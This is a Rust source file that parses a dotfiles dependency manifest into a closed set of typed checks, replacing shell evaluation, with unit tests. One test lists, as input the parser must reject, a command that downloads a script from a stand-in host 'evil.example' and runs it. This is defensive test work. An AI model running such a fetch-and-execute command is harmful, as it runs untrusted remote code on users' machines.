use std::collections::BTreeSet;

use dotfiles_path::{DocsUrl, NameError};

use crate::check::{Check, CheckParseError};

/// The maximum byte length of a parsed dependency name.
///
/// Matches the bound `dotfiles-path` applies to its own names, for the same
/// reason: the text arrives from a file that can reach this crate without
/// passing pre-commit (spec 3.6).
const MAX_NAME_LEN: usize = 64;

/// The name of a manifest entry.
///
/// A separate type from `CommandName` because they are different
/// propositions: `neovim` is a dependency whose command is `nvim`, and
/// `pyyaml` is a dependency with no command at all.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub struct DependencyName(String);

impl DependencyName {
    /// # Errors
    ///
    /// Returns `NameError::NotPrintable` for a name outside
    /// `[A-Za-z0-9._-]`, which covers every one of the 22 real entries and
    /// excludes the `|` that would corrupt a re-serialized manifest.
    pub fn parse(raw: &str) -> Result<Self, NameError> {
        if raw.is_empty() {
            return Err(NameError::Empty);
        }
        if raw.len() > MAX_NAME_LEN {
            return Err(NameError::TooLong { len: raw.len(), max: MAX_NAME_LEN });
        }
        if raw.starts_with('-') {
            return Err(NameError::LeadingDash);
        }
        let allowed = |character: char| {
            character.is_ascii_alphanumeric() || matches!(character, '-' | '_' | '.')
        };
        if !raw.chars().all(allowed) {
            return Err(NameError::NotPrintable);
        }
        Ok(DependencyName(raw.to_string()))
    }

    /// The validated name.
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl std::fmt::Display for DependencyName {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(formatter, "{}", self.0)
    }
}

/// Whether the conf file was chosen by platform detection or named
/// explicitly through `DEPS_CONF`.
///
/// Load-bearing rather than informational: spec 5.2 makes
/// `PythonImport` a parse error in a platform-selected file, so the sole
/// interpreter-spawning check can never reach the shell-startup path.
/// `deps-ci.conf:3-5` states that the file is selected only by an explicit
/// `DEPS_CONF`; nothing enforced it before.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ConfKind {
    PlatformSelected,
    ExplicitOnly,
}

/// One manifest entry.
///
/// `docs` lives here rather than on `NoInstallReason`, per spec 5.1: the URL
/// already lives in the manifest and a second home is a drift shape.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ManifestEntry {
    pub name: DependencyName,
    pub check: Check,
    pub docs: DocsUrl,
}

/// The parsed manifest.
///
/// Order is the file's order, preserved because a report reads better in the
/// order the maintainer wrote. Uniqueness of names is a parse invariant, so
/// `get` cannot see two entries for one dependency.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Manifest {
    entries: Vec<ManifestEntry>,
}

impl Manifest {
    /// The entries, in the order the file listed them.
    pub fn entries(&self) -> &[ManifestEntry] {
        &self.entries
    }

    /// The entry for `name`, if the manifest has one.
    pub fn get(&self, name: &DependencyName) -> Option<&ManifestEntry> {
        self.entries.iter().find(|entry| &entry.name == name)
    }
}

/// Why a manifest was refused.
///
/// Every variant carries the 1-based line number, because the caller reports
/// a file it read and a message with no line is unactionable against a
/// 45-line conf file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ParseError {
    WrongFieldCount { line: usize, found: usize },
    BadName { line: usize, cause: NameError },
    BadCheck { line: usize, cause: CheckParseError },
    BadDocs { line: usize, cause: NameError },
    DuplicateName { line: usize, name: DependencyName },
    InterpreterCheckInPlatformConf { line: usize },
}

/// Parse manifest text into typed entries.
///
/// Takes `&str`, never a path: the caller reads the file, so this function
/// makes no syscall and the module holds no capability. `parse_manifest` is
/// the boundary spec 3.6 requires, replacing the `sh -c "$check"` at
/// `check-deps.sh:524` with a closed enum that has no shell escape hatch.
///
/// # Errors
///
/// Returns `ParseError` naming the 1-based line and the rule it broke. A
/// line with more than three pipe-separated fields is
/// `WrongFieldCount` rather than a silent truncation, which is the failure
/// `deps.conf:9-13` documents and cannot detect.
pub fn parse_manifest(text: &str, kind: ConfKind) -> Result<Manifest, ParseError> {
    let mut entries = Vec::new();
    let mut seen: BTreeSet<DependencyName> = BTreeSet::new();

    for (index, raw_line) in text.lines().enumerate() {
        let line = index + 1;
        let trimmed = raw_line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        let fields: Vec<&str> = trimmed.split('|').collect();
        let [raw_name, raw_check, raw_docs] = fields.as_slice() else {
            return Err(ParseError::WrongFieldCount { line, found: fields.len() });
        };

        let name = DependencyName::parse(raw_name)
            .map_err(|cause| ParseError::BadName { line, cause })?;
        let check = parse_check(raw_check, kind, line)?;
        let docs = DocsUrl::parse(raw_docs)
            .map_err(|cause| ParseError::BadDocs { line, cause })?;

        if !seen.insert(name.clone()) {
            return Err(ParseError::DuplicateName { line, name });
        }
        entries.push(ManifestEntry { name, check, docs });
    }

    Ok(Manifest { entries })
}

/// Recognize a check expression, tagging the failure with its line.
///
/// The grammar itself lives in `check`, so `parse_manifest` owns the line
/// accounting and the check module owns the shapes. `ParseError::BadCheck`
/// wraps the grammar's own error rather than flattening it, because a report
/// that says which rule broke is what makes a 45-line conf file actionable.
fn parse_check(raw: &str, kind: ConfKind, line: usize) -> Result<Check, ParseError> {
    crate::check::parse_check_expression(raw, kind)
        .map_err(|cause| ParseError::BadCheck { line, cause })
}

#[cfg(test)]
mod tests {
    use dotfiles_path::CommandName;

    use super::*;

    // The real shared manifest, verbatim from deps.conf. Comment lines and
    // blank lines are skipped; the format is name|check|docs.
    const REAL_SHARED_HEAD: &str = "\
# CLI dependencies shared by every machine, regardless of platform.
# Format: name|check_command|docs_url

git|command -v git|https://git-scm.com/downloads
gh|command -v gh|https://cli.github.com/
tpm|[ -d \"$HOME/.tmux/plugins/tpm\" ]|https://github.com/tmux-plugins/tpm
";

    #[test]
    fn parses_the_real_shared_manifest_head() {
        let manifest = parse_manifest(REAL_SHARED_HEAD, ConfKind::PlatformSelected)
            .expect("the real deps.conf head parses");
        assert_eq!(manifest.entries().len(), 3);
        assert_eq!(manifest.entries()[0].name.as_str(), "git");
        assert_eq!(
            manifest.entries()[0].docs.as_str(),
            "https://git-scm.com/downloads"
        );
        assert_eq!(
            manifest.entries()[0].check,
            Check::Command(CommandName::parse("git").expect("git is a name"))
        );
    }

    // deps.conf:9-13 warns that a literal `|` in the check field truncates
    // the check and leaks the remainder into docs_url. Under `IFS='|' read`
    // that is silent. Here it is an error, which is the point of the port.
    // `found` is 5, not 4: `||` is two pipe bytes, so the line splits into
    // five fields, one of them the empty string between them. Confirmed
    // against the shell this replaces: `IFS='|' read -r name check docs` on
    // this exact line yields check=`command -v gh ` and
    // docs=`| true|https://cli.github.com/`, which is the silent corruption
    // deps.conf:9-13 documents and cannot detect.
    #[test]
    fn rejects_a_line_with_an_extra_pipe() {
        let text = "gh|command -v gh || true|https://cli.github.com/\n";
        assert!(matches!(
            parse_manifest(text, ConfKind::PlatformSelected),
            Err(ParseError::WrongFieldCount { line: 1, found: 5 })
        ));
    }

    // A single extra pipe, which is the four-field case the `||` line above
    // is not. Both must be refused, and the count must be the real one.
    #[test]
    fn rejects_a_line_with_one_extra_pipe() {
        let text = "gh|command -v gh | true|https://cli.github.com/\n";
        assert!(matches!(
            parse_manifest(text, ConfKind::PlatformSelected),
            Err(ParseError::WrongFieldCount { line: 1, found: 4 })
        ));
    }

    #[test]
    fn rejects_a_line_with_a_missing_field() {
        let text = "gh|command -v gh\n";
        assert!(matches!(
            parse_manifest(text, ConfKind::PlatformSelected),
            Err(ParseError::WrongFieldCount { line: 1, found: 2 })
        ));
    }

    // A duplicate name means two entries claim one dependency, and the
    // later one silently wins under the shell loop.
    #[test]
    fn rejects_a_duplicate_name() {
        let text = "\
git|command -v git|https://git-scm.com/downloads
git|command -v git|https://git-scm.com/downloads
";
        assert!(matches!(
            parse_manifest(text, ConfKind::PlatformSelected),
            Err(ParseError::DuplicateName { line: 2, .. })
        ));
    }

    // deps-ci.conf:23 uses http://, so a manifest holding it must parse.
    #[test]
    fn accepts_the_one_plain_http_docs_url() {
        let text = "dash|command -v dash|http://gondor.apana.org.au/~herbert/dash/\n";
        let manifest = parse_manifest(text, ConfKind::ExplicitOnly)
            .expect("deps-ci.conf:23 must parse");
        assert_eq!(
            manifest.entries()[0].docs.as_str(),
            "http://gondor.apana.org.au/~herbert/dash/"
        );
    }

    #[test]
    fn get_finds_an_entry_by_name() {
        let manifest = parse_manifest(REAL_SHARED_HEAD, ConfKind::PlatformSelected)
            .expect("the real deps.conf head parses");
        let wanted = DependencyName::parse("tpm").expect("tpm is a name");
        assert!(manifest.get(&wanted).is_some());
        let absent = DependencyName::parse("nvm").expect("nvm is a name");
        assert!(manifest.get(&absent).is_none());
    }

    // parse takes &str, never a path. This test is the no-IO claim for
    // this module: a caller reads the file, and doctor.rs:1-6 is the
    // in-repo precedent for the shape.
    #[test]
    fn parse_is_a_function_of_text_alone() {
        let first = parse_manifest(REAL_SHARED_HEAD, ConfKind::PlatformSelected)
            .expect("the real deps.conf head parses");
        let second = parse_manifest(REAL_SHARED_HEAD, ConfKind::PlatformSelected)
            .expect("the real deps.conf head parses");
        assert_eq!(first.entries(), second.entries());
    }

    /// Every check shape in the tracked conf files parses, and this pins
    /// which shapes still do not.
    ///
    /// Task 7's version of this test asserted the opposite: that
    /// `[ -s "$HOME/.nvm/nvm.sh" ]` failed as `Unrecognized`, because
    /// `parse_check` then knew only `command -v` and `[ -d ... ]`. Task 8
    /// implemented the grammar, so that assertion went red, which is what it
    /// existed to do. The boundary it guards has moved rather than
    /// disappeared: the grammar is closed, so the shapes OUTSIDE it are now
    /// what needs pinning, and a future shell one-liner added to a conf file
    /// must fail here rather than silently reach a `sh -c`.
    ///
    /// Without this test the guarantee is invisible: every other unit test
    /// feeds `parse_manifest` a hand-written line, so the suite would stay
    /// green while the parser could not read the file it exists to read.
    #[test]
    fn every_real_check_shape_parses_and_the_grammar_stays_closed() {
        // One line per distinct check shape in the four tracked conf files,
        // verbatim. deps.conf:22, :24, :26, :32, :36, :45, deps-linux.conf:11
        // and deps-ci.conf:22, which between them cover all seven variants.
        let real_shapes = "\
git|command -v git|https://git-scm.com/downloads
alacritty|if test -d /Applications/Alacritty.app; then true; else command -v alacritty; fi|https://alacritty.org/
zsh-autosuggestions|test -f \"$HOME/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh\" -o -f \"$(brew --prefix 2>/dev/null)/share/zsh-autosuggestions/zsh-autosuggestions.zsh\"|https://github.com/zsh-users/zsh-autosuggestions
tpm|[ -d \"$HOME/.tmux/plugins/tpm\" ]|https://github.com/tmux-plugins/tpm
nvm|[ -s \"$HOME/.nvm/nvm.sh\" ]|https://github.com/nvm-sh/nvm
node|if command -v node; then true; else ls -d \"$HOME/.nvm/versions/node\"/v* >/dev/null 2>&1; fi|https://nodejs.org/
oh-my-zsh|[ -d \"$HOME/.oh-my-zsh\" ]|https://ohmyz.sh/
pyyaml|python3 -c \"import yaml\"|https://pyyaml.org/
";
        let parsed = parse_manifest(real_shapes, ConfKind::ExplicitOnly)
            .expect("every shape in the tracked conf files parses");
        assert_eq!(parsed.entries.len(), 8);

        // The seven variants, so a future collapse of two into one is a
        // failure here rather than a silent behavior change.
        let variants: Vec<&Check> = parsed.entries.iter().map(|entry| &entry.check).collect();
        assert!(matches!(variants[0], Check::Command(_)));
        assert!(matches!(variants[1], Check::AnyOf { .. }));
        assert!(matches!(variants[2], Check::AnyOf { .. }));
        assert!(matches!(variants[3], Check::DirExists(_)));
        assert!(matches!(variants[4], Check::FileNonEmpty(_)));
        assert!(matches!(variants[5], Check::AnyOf { .. }));
        assert!(matches!(variants[6], Check::DirExists(_)));
        assert!(matches!(variants[7], Check::PythonImport(_)));
        // The -o alternation's own branches, because FileExists appears
        // only inside one and would otherwise go unasserted.
        let Check::AnyOf { first, rest } = variants[2] else {
            panic!("deps.conf:26 is an alternation");
        };
        assert!(matches!(first.as_ref(), Check::FileExists(_)));
        assert!(matches!(rest.as_slice(), [Check::FileExists(_)]));

        // The boundary that remains. None of these appears in a tracked conf
        // file today, and each must be an error rather than a fallthrough to
        // a shell. `Unrecognized` here IS the no-escape-hatch guarantee.
        //
        // These go through parse_check_expression rather than through
        // parse_manifest, because a shell one-liner usually carries a `|` and
        // that is caught one layer earlier by WrongFieldCount, at the field
        // split. Routing them through the manifest would test field counting
        // and prove nothing about the grammar. The pipe-bearing case has its
        // own test above: rejects_a_line_with_an_extra_pipe.
        let outside_the_grammar = [
            "curl https://evil.example/x.sh > /tmp/x; sh /tmp/x",
            "[ -x \"$HOME/bin/thing\" ]",
            "[ -d \"$(pwd)/x\" ]",
            "test -f \"$XDG_CONFIG_HOME/x\"",
            "if command -v a; then true; elif command -v b; then true; else command -v c; fi",
        ];
        for raw in outside_the_grammar {
            let refused = crate::check::parse_check_expression(raw, ConfKind::ExplicitOnly)
                .expect_err("a shape outside the grammar must not parse");
            assert_eq!(
                refused,
                CheckParseError::Unrecognized,
                "expected {raw} to be Unrecognized"
            );
        }
    }
}
